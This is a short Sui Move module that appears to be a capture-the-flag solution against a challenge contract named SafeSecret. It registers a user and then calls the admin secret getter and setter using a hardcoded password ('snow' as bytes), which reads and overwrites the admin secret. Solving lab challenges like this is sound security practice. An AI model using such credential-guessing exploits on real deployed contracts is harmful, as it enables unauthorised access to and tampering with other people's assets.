module suitfsol::solution {
    use sui::tx_context::TxContext;
    use suitfch::SafeSecret;

    public entry fun solve(users: &mut SafeSecret::Users, ctx: &mut TxContext) {
        let password : vector<u8> = vector[0x42, 0x42, 0x42, 0x42];
        let secret : vector<u8> = vector[0x41, 0x41, 0x41, 0x41];
        SafeSecret::register(users, password, secret, ctx);

        let password2 : vector<u8> = vector[115, 110, 111, 119];
        SafeSecret::get_admin_secret(users, password2);

        let password3 : vector<u8> = vector[115, 110, 111, 119];
        let new_secret : vector<u8> = vector[0x38, 0x58, 0x58, 0x58];
        SafeSecret::set_admin_secret(users, password3, new_secret);

        let password3 : vector<u8> = vector[115, 110, 111, 119];
        let new_secret : vector<u8> = vector[0x58, 0x58, 0x58, 0x58];
        SafeSecret::set_admin_secret(users, password3, new_secret);
    }
}
